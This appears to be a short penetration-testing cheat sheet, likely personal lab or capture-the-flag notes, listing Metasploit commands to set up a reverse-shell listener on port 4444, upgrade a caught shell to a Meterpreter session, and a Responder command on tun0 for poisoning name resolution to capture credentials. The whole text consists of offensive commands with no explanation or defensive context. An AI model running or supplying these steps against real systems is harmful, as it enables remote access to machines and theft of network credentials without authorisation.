## Reverse listener
```sh
use exploit/multi/handler // Reverse SHELL
set LHOST IP
set LPORT 4444
run
```

## Get meterpreter
```sh
use exploit/multi/handler // Reverse SHELL
set LHOST IP
set LPORT 4444
run

^Z

use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

// Load session
sessions -i 1
```


## Responder
`sudo responder -I tun0`    


